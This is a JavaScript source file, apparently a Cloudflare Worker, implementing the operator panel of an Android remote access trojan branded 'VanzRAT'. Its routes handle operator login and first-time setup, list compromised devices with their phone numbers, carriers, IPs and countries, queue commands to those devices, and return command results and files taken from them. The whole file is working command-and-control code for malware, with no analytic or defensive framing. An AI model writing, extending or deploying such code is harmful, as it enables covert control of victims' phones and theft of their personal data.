import { operatorAuth, signToken } from '../core/auth.js';
import { hashPassword } from '../core/crypto.js';
import { json, uuid, now } from '../core/util.js';
import { COMMANDS } from '../commands.js';
import { renderLogin } from '../../functions/login.js';
import { renderDashboard } from '../../functions/dashboard.js';
import { renderDevice } from '../../functions/device.js';

export async function handleLoginPage(req, env) {
  return new Response(renderLogin(env.PANEL_TITLE || 'VanzRAT'), {
    headers: { 'content-type': 'text/html; charset=utf-8' }
  });
}

export async function handleLoginPost(req, env) {
  const form = await req.formData();
  const u = String(form.get('username') || '');
  const p = String(form.get('password') || '');

  const op = await env.DB.prepare(
    'SELECT id, username, password_hash FROM operators WHERE username = ?'
  ).bind(u).first();

  if (!op) return new Response('Invalid credentials', { status: 401 });

  const h = await hashPassword(p, env.PASS_SALT || 'vanzrat-salt');
  if (h !== op.password_hash) {
    return new Response('Invalid credentials', { status: 401 });
  }

  const token = await signToken(
    { sub: op.id, u: op.username, exp: now() + 86400000 * 7 },
    env.JWT_SECRET || 'change-me'
  );

  return new Response(null, {
    status: 302,
    headers: {
      'location': '/panel',
      'Set-Cookie': `vanzrat_session=${token}; Path=/; HttpOnly; SameSite=Lax; Max-Age=604800`
    }
  });
}

export async function handleLogout(req, env) {
  return new Response(null, {
    status: 302,
    headers: {
      'location': '/login',
      'Set-Cookie': 'vanzrat_session=; Path=/; Max-Age=0'
    }
  });
}

export async function handleDashboard(req, env) {
  const op = await operatorAuth(req, env);
  if (!op) return Response.redirect(new URL('/login', req.url), 302);
  return new Response(renderDashboard(op.u, env.PANEL_TITLE || 'VanzRAT'), {
    headers: { 'content-type': 'text/html; charset=utf-8' }
  });
}

export async function handleDevicePage(req, env) {
  const op = await operatorAuth(req, env);
  if (!op) return Response.redirect(new URL('/login', req.url), 302);
  const id = new URL(req.url).pathname.split('/').pop();
  return new Response(renderDevice(op.u, id, COMMANDS, env.PANEL_TITLE || 'VanzRAT'), {
    headers: { 'content-type': 'text/html; charset=utf-8' }
  });
}

export async function handleApiDevices(req, env) {
  const op = await operatorAuth(req, env);
  if (!op) return json({ error: 'unauthorized' }, 401);
  const { results } = await env.DB.prepare(
    `SELECT id, model, brand, android, sdk, carrier, phone, battery,
            last_seen, first_seen, ip, country, status
     FROM devices ORDER BY last_seen DESC`
  ).all();
  return json({ devices: results });
}

export async function handleApiDevice(req, env, id) {
  const op = await operatorAuth(req, env);
  if (!op) return json({ error: 'unauthorized' }, 401);
  const d = await env.DB.prepare(
    'SELECT * FROM devices WHERE id = ?'
  ).bind(id).first();
  if (!d) return json({ error: 'not found' }, 404);
  return json({ device: d });
}

export async function handleApiCmd(req, env) {
  const op = await operatorAuth(req, env);
  if (!op) return json({ error: 'unauthorized' }, 401);
  const body = await req.json();
  const { device_id, cmd, args } = body;
  if (!device_id || !cmd) return json({ error: 'missing fields' }, 400);
  if (!COMMANDS[cmd]) return json({ error: 'unknown command' }, 400);

  const id = uuid();
  await env.DB.prepare(
    `INSERT INTO commands (id, device_id, cmd, args, status, created)
     VALUES (?, ?, ?, ?, 'pending', ?)`
  ).bind(id, device_id, cmd, JSON.stringify(args || {}), now()).run();

  return json({ ok: true, command_id: id });
}

export async function handleApiResults(req, env) {
  const op = await operatorAuth(req, env);
  if (!op) return json({ error: 'unauthorized' }, 401);
  const url = new URL(req.url);
  const device_id = url.searchParams.get('device_id');
  if (!device_id) return json({ error: 'device_id required' }, 400);

  const { results } = await env.DB.prepare(
    `SELECT r.id, r.command_id, r.data, r.file_key, r.created, c.cmd, c.args, c.status
     FROM results r
     LEFT JOIN commands c ON c.id = r.command_id
     WHERE r.device_id = ?
     ORDER BY r.created DESC LIMIT 200`
  ).bind(device_id).all();

  return json({ results });
}

export async function handleApiFile(req, env) {
  const op = await operatorAuth(req, env);
  if (!op) return json({ error: 'unauthorized' }, 401);

  const key = decodeURIComponent(
    new URL(req.url).pathname.replace('/api/op/file/', '')
  );

  const b64 = await env.FILES.get(`blob:${key}`);
  if (!b64) return new Response('Not found', { status: 404 });

  const metaRaw = await env.FILES.get(`meta:${key}`);
  let contentType = 'application/octet-stream';
  if (metaRaw) {
    try {
      const m = JSON.parse(metaRaw);
      contentType = m.type || contentType;
    } catch {}
  }

  const bin = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
  return new Response(bin, {
    headers: {
      'content-type': contentType,
      'cache-control': 'private, max-age=300'
    }
  });
}

export async function handleSetup(req, env) {
  const cnt = await env.DB.prepare('SELECT COUNT(*) AS c FROM operators').first();
  if (cnt.c > 0) return json({ error: 'already setup' }, 403);
  const { username, password } = await req.json();
  if (!username || !password) return json({ error: 'required' }, 400);
  const h = await hashPassword(password, env.PASS_SALT || 'vanzrat-salt');
  await env.DB.prepare(
    'INSERT INTO operators (id, username, password_hash, created) VALUES (?, ?, ?, ?)'
  ).bind(uuid(), username, h, now()).run();
  return json({ ok: true });
}
